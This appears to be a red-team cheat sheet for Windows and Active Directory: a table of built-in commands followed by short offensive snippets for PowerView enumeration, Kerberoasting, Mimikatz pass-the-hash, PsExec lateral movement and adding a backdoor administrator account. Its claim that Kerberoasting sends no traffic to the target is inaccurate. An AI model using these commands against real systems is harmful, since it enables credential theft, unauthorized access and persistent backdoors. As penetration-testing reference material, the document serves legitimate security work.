# Windows Red Team


| Command    | Description                                                                                                                                                                       |
|------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| ipconfig   | Display the IP configuration for all network interfaces. Example: ipconfig /all                                                                                                               |
| net        | A suite of commands for network settings and shares. Example: net user to list users.                                                                                                         |
| netstat    | Network statistics. Example: netstat -ano to display active TCP connections and process PID.                                                                                                  |
| nslookup   | Query the DNS server for domain name or IP address mapping. Example: nslookup example.com                                                                                                     |
| whoami     | Display the username and domain of the current user. Example: whoami                                                                                                                          |
| systeminfo | Display detailed configuration information about a computer and its operating system. Example: systeminfo                                                                                     |
| schtasks   | Schedule tasks to run periodically or at a specific time. Example: schtasks /create /tn TaskName /tr TaskRun /sc daily                                                                        |
| wmic       | Windows Management Instrumentation Command-line. Example: wmic process list brief lists details about all processes.                                                                          |
| gpresult   | Display the Resultant Set of Policy (RSoP) information for a remote user and computer. Example: gpresult /r                                                                                   |
| powershell | Starts a new PowerShell session. Example: powershell -exec bypass to start PowerShell with script execution policy bypassed.                                                                  |
| sc         | Service Control - manage Windows services. Example: sc query to display the status of services.                                                                                               |
| tasklist   | Lists all running tasks/processes. Example: tasklist                                                                                                                                          |
| taskkill   | Kill a running task/process. Example: taskkill /PID pid_number                                                                                                                                |
| reg        | Registry command that allows you to read from and write to the registry. Example: reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run to check all the programs that run at startup. |
| icacls     | Display or modify Access Control Lists (ACLs) for files and directories. Example: icacls C:\path\to\folder to display the ACLs.                                                               |
| netsh      | Network command to view or modify network configurations. Example: netsh wlan show profile to show saved WiFi profiles.                                                                       |

## Red Team Quick Strategies

Here's a succinct guide for some key Red Teaming concepts and practices regarding Windows and Active Directory.

**Enumeration** 

You start with gathering as much information as possible about the target environment. 

For instance, you can use PowerView, a PowerShell tool to explore Active Directory domain.
powerview: https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
Example:
```
Import-Module .\Powerview.ps1
Get-NetDomain
```
This command gets information about the current domain.

**Kerberoasting**

A technique that involves cracking service account passwords. TGS tickets get requested and cracked offline without sending any traffic to the target, hence evasion.

You can use Invoke-Kerberoast in PowerView to kerberoast:

```
Invoke-Kerberoast -OutputFormat Hashcat|Select-Object -ExpandProperty hash | Out-File -Encoding ASCII kerbhashes.txt
```
This command generates a Hashcat-ready file with all the hashes.

**Pass-the-Hash**

A technique where you use a user's NTLM hash instead of the plaintext password for authentication.

For example, using the tool Mimikatz:

```
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<ntlm_hash> /run:cmd.exe
```

This starts a new process (cmd.exe) with the specified user and hash.

**Lateral Movement**

This involves moving from one machine to another within the network to gain elevated privileges or to access specific resources.

A common method is to use PsExec for executing payloads on other machines:

```
PsExec.exe \\targetPC -u domain\username -p password cmd
```

This command runs cmd.exe on the target machine.

**Persistence**

Ensure you can retain access, even if the system reboots or the user logs out. A common method is to create a backdoor user in the AD.

```
net user /add [username] [password]
net localgroup administrators [username] /add
```

These commands add a new user and put it into the administrators group.

